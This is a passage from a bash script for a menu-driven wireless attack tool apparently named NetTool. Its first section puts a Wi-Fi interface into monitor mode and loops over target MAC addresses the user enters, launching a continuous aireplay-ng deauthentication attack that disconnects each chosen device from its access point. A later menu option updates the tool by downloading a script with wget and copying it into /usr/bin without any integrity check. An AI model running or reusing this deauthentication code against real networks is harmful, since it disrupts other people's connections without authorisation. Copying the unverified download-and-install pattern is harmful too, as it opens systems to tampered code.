                                        xterm -geometry 80x20-0+1 -e "airodump-ng --bssid $BSSID --channel $ap_chan $interface " & sleep 2
                                        for (( i = 1; i < targets+1; i++ )); do
                                            echo -en "$orange""Type Target's MAC-Address nÂ° $i :  $nc"
                                            read dv_mac
                                            echo -e "$cyan""Kicking$nc""$red"" $dv_mac $nc"
                                            sleep 0.5
                                            xterm -geometry 80x15-0-0 -e "sudo aireplay-ng -0 0 -a $BSSID -c $dv_mac $interface " & sleep 2
                                        done
                                        echo -en "$blue""PRESS [ RETURN ] TO STOP KICKING$nc"
                                        read input
                                        pkill airodump-ng
                                        pkill aireplay-ng
                                        echo 'Cleaning files...'
                                        rm ap_scan.txt aps_scan.txt  >/dev/null 2>&1
                                        sleep 0.5
                                        echo "Restoring deinterfacevice to managed mode... "
                                        sudo ifconfig "$interface" down >/dev/null 2>&1
                                        sudo iwconfig "$interface" mode managed >/dev/null 2>&1
                                        sudo ifconfig "$interface" up >/dev/null 2>&1
                                        sudo systemctl restart NetworkManager 
                                        sleep 5
                                        echo -e "$blue""Going back to Menu...$nc"
                                        sleep 1
                                    else 
                                        echo -e "$red""Unable to change interface to monitor mode!$nc"
                                        break
                                    fi
                            else    
                                echo "Going back to menu..."
                                sleep 1
                            fi
                        fi  
                    fi    
                fi
                ;;
                esac
                ;;
        5)
        ACTION='\033[1;90m'
        FINISHED='\033[1;96m'
        READY='\033[1;92m'
        NOCOLOR='\033[0m' # No Color
        ERROR='\033[0;31m'

        netTool_path=$(find /home/${SUDOUSER} -name "NetTool" | grep .*/NetTool/netTool)
        NetTool_Dir=$(find /home/${SUDOUSER} -name "NetTool" | grep .*/NetTool)
        cd $NetTool_Dir
        #checking for internet
        while true; do
            clear
            echo -e "$yellow""Checking for internet connection$nc"
            sleep 0.1
            clear
            echo -e "$yellow""Checking for internet connection.$nc"
            sleep 0.1
            clear
            echo -e "$yellow""Checking for internet connection..$nc"
            sleep 0.1
            clear
            echo -e "$yellow""Checking for internet connection...$nc"
            sleep 0.1
            clear
        done & 

        trap 'kill $!' SIGTERM SIGKILL
        sleep 2
        wget -q --spider https://www.google.com
        if [ $? -eq 0 ]; then
            echo -e "$green""Connected to internet$nc [$greenâ$nc]"
            kill $!
            sleep 3
            clear
            sleep 0.5
            echo
            cd $NetTool_Dir
            echo -e ${ACTION}Checking Git repo
            echo -e =======================${NOCOLOR}
            BRANCH=$(git rev-parse --abbrev-ref HEAD)
            if [ "$BRANCH" != "master" ]; then
                echo -e ${ERROR}Not on master. Aborting. ${NOCOLOR}
                echo
                sleep 2
            else 
                echo -e ${ACTION}Checking For Update...${NOCOLOR}
                git fetch >/dev/null 2>&1
                HEADHASH=$(git rev-parse HEAD)
                UPSTREAMHASH=$(git rev-parse master@{upstream})
            if [ "$HEADHASH" != "$UPSTREAMHASH" ]; then
                echo -e ${ACTION}New Update Available!.${NOCOLOR}
                echo -e ${READY}Do you want to update?${NOCOLOR}
                read input
                echo -e ${ACTION}Updating now...${NOCOLOR}
                sleep 1
                rm netTool
                wget https://raw.githubusercontent.com/disc0nct/NetTool/master/netTool
                chmod a+x netTool
                rm /usr/bin/netTool
                cp netTool /usr/bin/
                echo -e ${FINISHED}DONE!${NOCOLOR}
		sleep 1
		echo -e $lightred"Please run 'netTool' again!"
                sleep 2
                exit 
            else
                echo -e ${FINISHED}No Update Available!.${NOCOLOR}
            fi
        fi
        else   
            echo -e "$lightred""No internet connection$nc [$ligthredâ$nc]$nc"
            echo -e "$yellow""Please make sure you are connected to internet!" "$nc"
            kill $!
            exit 1
        fi
        ;;
        e)  echo 'Cleaning Files...'
            rm aps_scan.txt connected_ap_bssid.txt connected_ap_essid.txt hosts.txt scan.txt >/dev/null 2>&1
            sleep 0.5
            echo -e "$lightred""Bye bye :)$nc"
            sleep 0.5
            clear
            exit 1 
        ;;
    esac
done
